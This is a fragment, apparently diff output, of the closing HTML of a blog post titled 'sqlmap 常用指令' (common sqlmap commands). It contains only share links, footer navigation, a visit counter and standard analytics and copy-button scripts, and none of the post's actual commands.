-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&is_video=false&description=sqlmap 常用指令"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=sqlmap 常用指令&body=Check out this article: https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&name=sqlmap 常用指令&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&t=sqlmap 常用指令"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2023
-    iahzl
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-      --><li><a href="/">Home</a></li><!--
-    --><!--
-      --><li><a href="/categories/">Categories</a></li><!--
-    --><!--
-      --><li><a href="/tags/">Tags</a></li><!--
-    --><!--
-      --><li><a href="/archives/">Writing</a></li><!--
-    --><!--
-      --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
-    --><!--
-      --><li><a href="/search/">Search</a></li><!--
-    --><!--
-      --><li><a href="/about/">About</a></li><!--
-    -->
-      </ul>
-      <ul>
-        
-          <!-- 不蒜子统计 -->
-          <span id="busuanzi_container_site_pv">
-              本站总访问量<span id="busuanzi_value_site_pv"></span>次
-          </span>
-          <span class="post-meta-divider">|</span>
-          <span id="busuanzi_container_site_uv" style='display:none'>
-                  本站访客数<span id="busuanzi_value_site_uv"></span>人
-          </span>
-        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-        
-      </ul>
-    </nav>
-  </div>
-  
-</footer>
-
-
-
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-  <script type="text/javascript">
-        var _hmt = _hmt || [];
-        (function() {
-          var hm = document.createElement("script");
-          hm.src = "https://hm.baidu.com/hm.js?10298bb37106529e820abfbd855cea34";
-          var s = document.getElementsByTagName("script")[0];
-          s.parentNode.insertBefore(hm, s);
-        })();
-        </script>
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
 
 </body>
 </html>
